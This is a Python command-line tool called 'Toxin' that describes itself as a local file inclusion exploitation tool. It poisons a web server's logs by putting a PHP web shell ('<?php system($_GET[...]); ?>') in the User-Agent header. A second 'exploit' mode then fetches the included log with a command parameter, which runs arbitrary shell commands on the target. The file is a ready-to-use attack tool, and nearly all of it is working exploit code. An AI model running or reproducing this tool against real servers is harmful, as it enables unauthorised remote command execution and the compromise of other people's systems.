#!/usr/bin/env python

from __future__ import print_function
from pydoc import pager
from pyfiglet import Figlet
import click
import requests

# Globals
FIG = Figlet(font='slant')
FIG_TEXT = FIG.renderText('Toxin')
TITLE_TEXT = 'Toxin: Local File Inclusion Exploitation Tool'
CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])
VERSION_TEXT = '{} \n %(prog)s v%(version)s \n \
by Trhacknon Security'.format(FIG_TEXT)


# Custom help text
def print_help(ctx, value):
    if value is False:
        return
    print(FIG_TEXT)
    click.echo(ctx.get_help())
    ctx.exit()


@click.command(name='Toxin', context_settings=CONTEXT_SETTINGS,
               help=TITLE_TEXT)
@click.option('--url', '-u', help='URL to query')
@click.option('--parameter', '-p', default='cmd',
              help="Parameter to inject into User-Agent header \
              (Default: 'cmd')")
@click.option('--command', '-c', help='Command to Run')
@click.option('--mode', '-m', help='Mode (Inject or Exploit)')
@click.option('--paged', '-g', is_flag=True, help='Paged Output')
@click.version_option(version=1.0, prog_name='Toxin', message=VERSION_TEXT)
@click.help_option()
@click.pass_context
def toxin(ctx, parameter=None, url=None, command=None, mode=None, paged=None):

    headers = {'User-Agent': F"<?php system($_GET[{parameter}]); ?>"}

    if mode == 'inject':

        response = requests.get(url, headers=headers)

        if paged is True:
            pager(response.text)
        else:
            print(response.text)

    elif mode == 'exploit':

        response = requests.get(F'{url}&{parameter}={command}')

        if paged is True:
            pager(response.text)
        else:
            print(response.text)

    elif mode is None:
        pass
    else:
        raise RuntimeError('Invalid Run Mode')

    for param in parameter, url, command, mode, paged:
        if param is None:
            print_help(ctx, value=True)


if __name__ == '__main__':
    toxin()
